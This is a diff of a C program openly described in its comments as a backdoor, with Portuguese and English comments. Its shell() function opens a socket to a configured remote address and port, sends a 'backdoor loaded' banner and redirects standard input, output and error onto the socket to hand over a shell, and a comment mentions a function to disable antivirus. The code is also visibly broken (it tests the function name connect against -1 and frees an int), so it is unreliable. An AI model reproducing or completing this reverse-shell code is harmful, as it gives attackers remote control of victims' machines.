@@ -32,7 +32,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 #include <X11/Xlib.h>
 
 #define remote_addr "127.0.0.1"
-#define remote_port 2125
+#define remote_port 2222
 
 #define false 0
 #define true 1
@@ -64,8 +64,6 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   exit(EXIT_FAILURE);
 
   } /* exit without exceptions... and keep the routine.
-
-
   //function  to disable antivirus. */
 
   void
@@ -188,15 +186,11 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 }
     void
     backdoor_connect()
-    {
-     int novaX, x;
-    FILE *filecmd;
-    struct sockaddr_in s;
-    int root;
-    char command[bytes];
-    char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
-    char *cmd[] = { "/bin/sh", (char *)0 };
 
+    {
+
+    int x;
+    struct sockaddr_in s;
     /* setting up the connection */
 
      memset(s.sin_zero, '\0', sizeof s.sin_zero);
@@ -206,16 +200,19 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      malloc(sizeof (x));
 
      x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */
+     //while (connect == false)
+     //listen(x,10);
 
     /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
                    discomment this if u think necessary... */
-
      (connect(x, (struct sockaddr *)&s, sizeof(s)));
      if (connect == -1)
      perror("socket(SOCKET_CONNECT)connect_failed");
 
      if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
      perror("setsockopt(SO_REUSEADDR)failed");
+
+     return;
 
      //listen(x,10);
 
@@ -257,15 +254,13 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
 
   /*função para o programa rodar em background, como uma daemon
-
-
    create reverse connection */
 
   void
   shell()
 
   {
-    int novaX, x;
+    int  x;
     FILE *filecmd;
     struct sockaddr_in s;
     int root;
@@ -333,22 +328,19 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      perror("setsockopt(SO_REUSEADDR)failed");
 
      /* fck, now  i have power!
-
       made conditions here. */
-
-     send(x,"\n backdoor loaded...entrying",30,0), send(x,"\n Connected in machine \n\n",25,0);
+     if(recv(x,command,bytes,NULL) == true)
+     backdoor_connect();
+     send(x,"\n...\n **\n ** backdoor loaded...",33,0), send(x,"\n Connected in machine \n\n",25,0);
 
      /*handle with the impossible errors. */
-
-     if(recv(x,novaX,bytes,NULL) < 0);
-     perror("Connection failed:");
 
      if(connect == -1)
      perror("BREAK CONNECTION,(failure)");
 
      else
 
-     if(recv(x,novaX,bytes,NULL) > 0);
+     if(recv(x,command,bytes,NULL) > 0);
 
      XFreeCursor;
      dup2(x, 0),dup2(x, 1),dup2(x, 2);
@@ -356,7 +348,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      return;
 
-     free(x);
+     free(x); /* freedom for x! */
 
      }
 
@@ -389,4 +381,4 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
 
 
-    }
+}
